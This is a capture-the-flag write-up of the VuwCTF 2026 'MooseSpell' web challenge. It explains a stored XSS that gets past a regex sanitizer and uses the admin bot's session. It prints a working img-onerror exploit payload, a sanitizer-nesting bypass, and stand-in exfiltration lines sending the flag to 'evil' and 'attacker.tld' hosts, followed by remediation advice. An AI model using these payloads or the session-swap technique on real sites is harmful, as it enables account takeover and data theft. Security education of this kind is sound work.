# 🫎 MooseSpell — VuwCTF 2026

> *MooseSpell is where young moose inscribe and share their incantations. The Archmage Moose guides his disciples in creating their spells. His own grimoire, however, is sealed to young moose. Its words are for his eyes alone.*

| | |
|---|---|
| **Category** | Web |
| **Target** | `https://moosespell-51cd4a7b08debe71.challenges.2026.vuwctf.com/` |
| **Stack** | Flask 2.2.5 · Flask-SQLAlchemy · PyJWT · SQLite · Selenium (headless Chrome bot) |
| **Flag** | `VuwCTF{the_w1ll_of_4r5h_m3ge}` |

---

## Table of contents

1. [TL;DR](#tldr)
2. [Recon](#recon)
3. [Source review](#source-review)
4. [Dead ends](#dead-ends-what-the-author-locked-down)
5. [Vulnerability 1 — stored XSS via an incomplete sanitizer](#vulnerability-1--stored-xss-via-an-incomplete-sanitizer)
6. [Vulnerability 2 — the bot *is* the authorization bypass](#vulnerability-2--the-bot-is-the-authorization-bypass)
7. [The real puzzle — exfiltration under CSP](#the-real-puzzle--exfiltration-under-csp)
8. [The key insight — swap the session, not the data](#the-key-insight--swap-the-session-not-the-data)
9. [Full exploit](#full-exploit)
10. [Running it](#running-it)
11. [Remediation](#remediation)
12. [Takeaways](#takeaways)

---

## TL;DR

The spell viewer renders user content with Jinja's `|safe`, guarded only by a regex that strips the literal string `<script`. An `<img onerror=…>` sails straight through. `/report` sends a headless Chrome logged in as **Archmage Moose** to any spell you name, so the payload executes with admin privileges and can read the flag spell.

The interesting half is getting the flag *out*. A strict CSP (`default-src 'self'`) kills every outbound channel, and the session cookie is `httponly` so it can't be stolen either. The trick: don't exfiltrate the data — **exfiltrate the session**. The payload reads the flag as admin, then `POST`s to `/login` with the attacker's own credentials, overwriting the bot's cookie, and re-inscribes the stolen text as a spell. Because `Spell.author` is derived from `current_user.name`, the loot lands in *our* spellbook, readable with an ordinary session. Entirely same-origin, entirely within the CSP.

```
stored XSS  ─▶  admin bot visits  ─▶  read flag spell  ─▶  re-login as attacker  ─▶  re-inscribe loot  ─▶  read it normally
```

---

## Recon

The app is small: an index, register/login, a spellbook, a spell viewer, and a report button.

```console
$ curl -si https://moosespell-51cd4a7b08debe71.challenges.2026.vuwctf.com/ | head -5
HTTP/2 200
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:
content-type: text/html; charset=utf-8
server: Werkzeug/2.2.2 Python/3.11.15
```

Two things jump out immediately:

* **A CSP is present** — and a fairly tight one. That's a deliberate signal that this is an XSS challenge *with a twist*, because the obvious exfil paths are pre-emptively closed.
* **`'unsafe-inline'` is allowed for scripts** — so inline event handlers will execute. The CSP is there to stop exfiltration, not to stop execution.

The landing page also tells you the win condition in-character:

> *Not every spell is meant for every eye. Should you find one troubling, report it to the Archmage Moose; he reviews all that is reported.*

That's an admin-bot XSS challenge in plain language.

---

## Source review

### Data model and seeding — [`app.py:28-58`](app.py#L28-L58)

```python
class User(db.Model):
    id       = db.Column(db.String(50), primary_key=True)
    name     = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)
    admin    = db.Column(db.Boolean, default=False)

class Spell(db.Model):
    id          = db.Column(db.String(50), primary_key=True)
    author      = db.Column(db.String(120), nullable=False)
    title       = db.Column(db.String(120), nullable=False)
    incantation = db.Column(db.String(4096), nullable=False)
```

On first boot the app seeds one admin (`Archmage Moose`) and one spell whose **incantation is the flag**:

```python
db.session.add(Spell(
    id=str(uuid.uuid4()),
    author='Archmage Moose',
    title='The Forbidden Bugle',
    incantation=app.config['FLAG'],
))
```

So the flag is a normal row in the spells table. There is no special "flag endpoint" — the goal is simply to read a spell we don't own. Note the id is a random UUIDv4, so it can't be guessed; it has to be *discovered*.

### Authentication — [`app.py:72-94`](app.py#L72-L94)

A stateless JWT in a cookie:

```python
token = request.cookies.get('jwt_token')
data  = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
current_user = User.query.filter_by(id=data['id']).first()
```

```python
response.set_cookie('jwt_token', token, httponly=True, samesite='Lax')
```

`httponly=True` means `document.cookie` is useless to us — the classic "steal the admin cookie" ending is off the table by design.

### The Content Security Policy — [`app.py:61-69`](app.py#L61-L69)

Applied to *every* response via `@app.after_request`:

```python
response.headers['Content-Security-Policy'] = (
    "default-src 'self'; "
    "script-src 'self' 'unsafe-inline'; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data:"
)
```

### The sanitizer — [`app.py:152-153`](app.py#L152-L153)

```python
def sanitize(text):
    return re.sub(r'<\s*script', '', text, flags=re.IGNORECASE)
```

That is the *entire* XSS defence.

### The sink — [`templates/spell.html:8-12`](templates/spell.html#L8-L12)

```jinja
<h1>{{ spell.title }}</h1>
<div class="incantation">{{ spell.incantation|safe }}</div>
```

Note the asymmetry: `spell.title` is auto-escaped by Jinja and is **not** a sink; `spell.incantation` is explicitly marked `|safe` and is rendered raw. The incantation is the injection point.

### Access control — [`app.py:183-193`](app.py#L183-L193)

```python
if spell.author != current_user.name and not current_user.admin:
    return make_response(jsonify({'message': 'This spell is not yours to read'}), 403)
```

Two ways to read the flag spell: *be* Archmage Moose, or be **any** admin. There is no third path.

### The bot — [`app.py:196-226`](app.py#L196-L226)

```python
driver.get('http://127.0.0.1:1337/login')
driver.find_element(By.ID, 'username').send_keys('Archmage Moose')
driver.find_element(By.ID, 'password').send_keys(app.config['ADMIN_PASSWORD'])
driver.find_element(By.ID, 'submit').click()
time.sleep(2)
driver.get(f'http://127.0.0.1:1337/spells/{spell_id}')
time.sleep(5)
```

A headless Chrome authenticates as the admin and then visits a spell id **we choose**. It lingers 5 seconds — plenty of time for an async payload. This is our code-execution-as-admin primitive.

---

## Dead ends (what the author locked down)

Worth documenting, because ruling these out is what points you at the intended path.

<details>
<summary><b>JWT forgery</b> — blocked</summary>

`jwt.decode(..., algorithms=['HS256'])` explicitly pins the algorithm, so the `alg: none` confusion trick fails. `SECRET_KEY` comes from the environment and is not leaked anywhere. There is no `admin` claim in the token anyway — privilege is read from the database row (`current_user.admin`), so even a forged token wouldn't grant admin unless it named an admin's `id`.
</details>

<details>
<summary><b>Registering as the Archmage</b> — blocked</summary>

`User.name` is `unique`, and `/register` checks for an existing user, so `Archmage Moose` is taken. Case-variant tricks (`archmage moose`) don't help either: the ownership check is a plain Python `!=` on the exact string, so a differently-cased name simply fails the comparison. Same for trailing-whitespace variants.
</details>

<details>
<summary><b>Abusing the bot as an SSRF / arbitrary-URL visitor</b> — blocked</summary>

```python
if not spell_id or not re.fullmatch(r'[A-Za-z0-9\-]+', str(spell_id)):
    return make_response(jsonify({'message': 'Invalid spell id'}), 400)
```

`re.fullmatch` with no `.`, `/`, `:` or `%` in the class rules out path traversal (`../../`), absolute URLs, and encoded separators. The bot only ever visits `/spells/<safe-id>` on localhost.
</details>

<details>
<summary><b>Brute-forcing the flag spell's UUID</b> — infeasible</summary>

UUIDv4, 122 bits of entropy. Not happening. The id must be *discovered* from inside the admin's session.
</details>

<details>
<summary><b>Stealing the cookie</b> — blocked</summary>

`httponly=True`. `document.cookie` returns nothing useful.
</details>

---

## Vulnerability 1 — stored XSS via an incomplete sanitizer

`sanitize()` is a denylist of exactly one token. Everything else about HTML is fair game — and since `script-src 'self'` would block `<script src="//evil">` anyway, the sanitizer is defending against the one vector the CSP *already* handles, while `'unsafe-inline'` leaves the actually-useful vector wide open.

Any tag with an event handler works:

```html
<img src=x onerror="…">
<svg onload="…">
<body onload="…">
<details open ontoggle="…">
```

I used `<img src=x onerror=…>` — `src=x` is guaranteed to 404, so `onerror` always fires.

> **Bonus bypass.** `re.sub` does a single non-overlapping pass, so the sanitizer is also trivially defeated by nesting the forbidden token inside itself:
>
> ```
> input:  <scr<scriptipt>alert(1)</script>
> after:  <script>alert(1)</script>
> ```
>
> The regex removes the inner `<script`, and the surrounding fragments close up into a real tag. Cute, but unnecessary here — and it would be blocked by `script-src 'self'` unless made inline.

### Payload constraints

The payload is stored, then re-rendered inside an HTML attribute. Two rules to respect:

1. **No double quotes** in the JS, since `onerror="…"` is delimited by them. Easily satisfied — `JSON.stringify` builds all the JSON for us, and every literal uses single quotes.
2. **No literal `<script`** anywhere. `</div>` in a regex is fine; `<` is perfectly legal inside a quoted attribute value.

Note also that **`eval()` and `new Function()` are unavailable** — `script-src` has `'unsafe-inline'` but not `'unsafe-eval'`. So the base64-blob-and-`eval` idiom won't work; the payload has to be written out longhand in the attribute. (If you really want indirection, `document.createElement('script')` + `.textContent` counts as an inline script and *is* permitted under `'unsafe-inline'`.)

---

## Vulnerability 2 — the bot *is* the authorization bypass

Once our JS runs in the Archmage's session, `current_user.admin` is `True` and the ownership check at [`app.py:190`](app.py#L190) waves us through to any spell.

But we still need the flag spell's UUID. This is where the challenge is generous — look at the spellbook listing:

```python
my_spells = Spell.query.filter_by(author=current_user.name).all()
return render_template('spells.html', spells=my_spells)
```

`/spells` filters by `author == current_user.name`. For the bot, that name is `Archmage Moose` — so **for the bot, `/spells` *is* the Archmage's private grimoire**, and [`templates/spells.html:20-23`](templates/spells.html#L20-L23) helpfully prints every id:

```jinja
<a href="/spells/{{ spell.id }}">{{ spell.title }}</a> &mdash; <code>{{ spell.id }}</code>
```

So the discovery step is one `fetch('/spells')` and a regex.

---

## The real puzzle — exfiltration under CSP

We can read the flag inside the bot's browser. Now get it to us. Walk the CSP directive by directive:

| Channel | Verdict |
|---|---|
| `fetch()` / `XHR` to an attacker host | ❌ `connect-src` falls back to `default-src 'self'` |
| WebSocket / EventSource | ❌ same fallback |
| Image beacon `new Image().src = 'https://evil/?'+flag` | ❌ `img-src 'self' data:` |
| `<script src>`, `<link>`, `<iframe>`, fonts, media | ❌ `default-src 'self'` |
| CSS-based leaks (`background: url(...)`) | ❌ external fetches still blocked |
| DNS prefetch / `<link rel=preconnect>` | ❌ `default-src` |
| Reading the cookie and posting it somewhere | ❌ `httponly`, and nowhere to post it |

The only genuine gap is that **CSP fetch directives don't govern top-level navigation** — there's no `form-action` or `navigate-to` in the policy, so `location = 'https://attacker.tld/?f=' + flag` would in fact escape. That's a legitimate solution *if* the challenge container has outbound internet access and you have a listener (`webhook.site`, a VPS, an ngrok tunnel, …).

I didn't want to depend on either assumption. There's a cleaner path that never leaves the origin.

---

## The key insight — swap the session, not the data

The exfil channel is the application itself. Look at how a spell's owner is decided — [`app.py:168-173`](app.py#L168-L173):

```python
spell = Spell(
    id=spell_id,
    author=current_user.name,      # ← whoever the cookie says you are, right now
    title=sanitize(title),
    incantation=sanitize(incantation),
)
```

And how `/login` behaves — [`app.py:144-147`](app.py#L144-L147):

```python
token = issue_token(user)
response = make_response(jsonify({'message': 'Login successful'}), 201)
response.set_cookie('jwt_token', token, httponly=True, samesite='Lax')
```

`/login` is a plain same-origin `POST` with a JSON body. Our XSS can call it. And when it does, the `Set-Cookie` in the response **overwrites the bot's `jwt_token`** — `httponly` stops JavaScript from *reading* a cookie, it does nothing to stop the server from *replacing* one on a request JavaScript initiated. From that moment the headless browser is no longer the Archmage; it's us.

So the payload runs in four beats:

1. **Discover** — `fetch('/spells')` as admin, scrape the spell UUIDs.
2. **Read** — `fetch('/spells/<id>')` for each; admin bypasses the ownership check. Pull the `.incantation` div out of each page.
3. **Become the attacker** — `fetch('/login', {…our creds…})`, silently swapping the session cookie.
4. **Deposit** — `fetch('/spells', {…})` with the harvested text as the incantation. `author` is now *our* username, so the spell is filed in our spellbook.

Then we log in normally and read our own spell. No external infrastructure, no egress assumptions, no CSP violation — every request is same-origin and completely ordinary.

> The conceptual mistake being punished here is treating the CSP as the security boundary for *data*, when the app itself offers a read/write store that both principals can reach. A same-origin write primitive is an exfil channel.

---

## Full exploit

The injected JavaScript (formatted for readability; it ships as one line inside the attribute):

```js
(async () => {
  // 1. For the bot, /spells lists Archmage Moose's own spells.
  const l = await (await fetch('/spells')).text();
  const ids = [...new Set([...l.matchAll(/spells\/([a-z0-9-]{36})/g)].map(m => m[1]))];

  // 2. Read each one — admin bypasses the ownership check.
  let o = '';
  for (const i of ids) {
    const p = await (await fetch('/spells/' + i)).text();
    const m = p.match(/incantation[^>]*>([\s\S]*?)<\/div>/);
    o += (m ? m[1] : '?') + ' ;; ';
  }

  // 3. Overwrite the bot's httponly cookie with our own session.
  await fetch('/login', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({username: 'moosehax9', password: 'hunter2hunter2'})
  });

  // 4. Spell.author == current_user.name -> lands in OUR spellbook.
  await fetch('/spells', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({title: 'loot', incantation: o.slice(0, 3000)})
  });
})()
```

Wrapped in the tag that survives `sanitize()`:

```html
<img src=x onerror="(async()=>{ … })()">
```

Details that matter:

* **`[a-z0-9-]{36}`** matches a UUID exactly; `new Set(...)` dedupes because [`spells.html`](templates/spells.html) prints each id twice (once in the `href`, once in the `<code>` tag).
* **`o.slice(0, 3000)`** stays under the `String(4096)` column limit on `incantation`.
* **No double quotes** anywhere in the JS — the attribute is `"`-delimited.
* The `<` characters in `<\/div>` are fine inside a quoted attribute value, and none of them spell `<script`.

The full driver is in [`solve.py`](solve.py) — it registers, logs in, plants the payload, triggers `/report`, then polls the spellbook for the new loot spell and regexes out the flag.

---

## Running it

```console
$ python3 solve.py
[*] target https://moosespell-51cd4a7b08debe71.challenges.2026.vuwctf.com
[*] register: {"message":"Young moose registered"}
[*] login   : {"message":"Login successful"}
[+] payload inscribed as c3923e5c-adf5-4322-bd28-695c1c266a9f
[*] luring the Archmage (this takes ~7s of bot time)...
[*] report  : {"message":"The Archmage Moose has reviewed your spell"}
[+] FLAG: VuwCTF{the_w1ll_of_4r5h_m3ge}
```

Or manually, to see the loot sitting in your own spellbook:

```console
$ curl -s -b cookies.txt "$BASE/spells/<loot-id>" | grep -o 'VuwCTF{[^}]*}'
VuwCTF{the_w1ll_of_4r5h_m3ge}
```

**Operational notes**

* `/report` blocks for ~7 s (2 s login wait + 5 s on the spell page) before returning, and it spawns a real Chrome each time — don't hammer it.
* The bot is not perfectly reliable. In testing, one run returned `201` from `/report` but produced no loot spell; the same payload worked on the runs before and after it. `/report` always answers `201` regardless of what happened inside Selenium, so a silent failure is indistinguishable from success — if no loot appears, just re-run.
* The instance resets periodically (a fresh boot wipes the SQLite DB and re-seeds the flag with a **new** spell UUID). If `/register` suddenly succeeds again for a username you already created, the box restarted — nothing is hardcoded to the old ids, so just re-run.

---

## Remediation

| # | Fix | Why |
|---|---|---|
| 1 | **Drop `\|safe`.** Render `{{ spell.incantation }}` escaped, exactly like `spell.title` already is. | Kills the sink outright. If rich text is genuinely required, sanitize with an allowlist parser (`bleach`, DOMPurify), never a regex — HTML is not a regular language. |
| 2 | **Remove `'unsafe-inline'` from `script-src`;** serve a per-response nonce or hash instead. | Without it the `onerror` handler never fires, and the CSP becomes a real second line of defence rather than decoration. |
| 3 | **Re-authenticate state-changing requests.** Require the current password (or a CSRF token bound to the session) before `/login` may replace an active session. | Closes the session-swap exfil channel: the payload could no longer silently re-home the browser. |
| 4 | **Scope the bot.** Give the reviewing headless browser a dedicated, least-privilege account that can read reported spells but is not the flag's author, and run it on a separate origin/profile. | The bot currently carries the single most valuable session in the app. |
| 5 | **Add `form-action 'self'; base-uri 'none'; frame-ancestors 'none'`** to the policy. | Closes the top-level-navigation exfil that the current policy leaves open, and blocks `<base>` hijacking. |
| 6 | Don't leak object ids in a listing that a privileged principal renders (or gate the listing separately). | The bot's own `/spells` page is what handed us the flag's UUID. |

---

## Takeaways

* **A denylist that names one token is not a sanitizer.** `<script` is the *least* interesting way to run JavaScript; event handlers on ordinary tags are the norm.
* **CSP is not an exfiltration boundary when the app is a read/write store.** Any endpoint that lets an attacker-controlled principal write data that another principal can read is a same-origin covert channel. Here it was literally the app's core feature.
* **`httponly` protects reads, not writes.** JavaScript can't read the cookie — but it can make the *server* hand out a new one. A login endpoint reachable from XSS is a session-rewrite primitive.
* **Ask what an admin bot's "normal" pages reveal.** The winning move wasn't a clever gadget; it was noticing that `filter_by(author=current_user.name)` means the bot's own spellbook is the secret index.
* Enumerate the closed doors before hunting for the open one. Pinned JWT algorithms, a strict `fullmatch` on the report id, and a unique username constraint all say the same thing: *the author wants you in the browser, not in the backend.*

---

## Files

| File | |
|---|---|
| [`app.py`](app.py) | Challenge source |
| [`solve.py`](solve.py) | Full automated exploit |
| [`templates/spell.html`](templates/spell.html) | The `\|safe` sink |
| [`templates/spells.html`](templates/spells.html) | The id-disclosure listing |
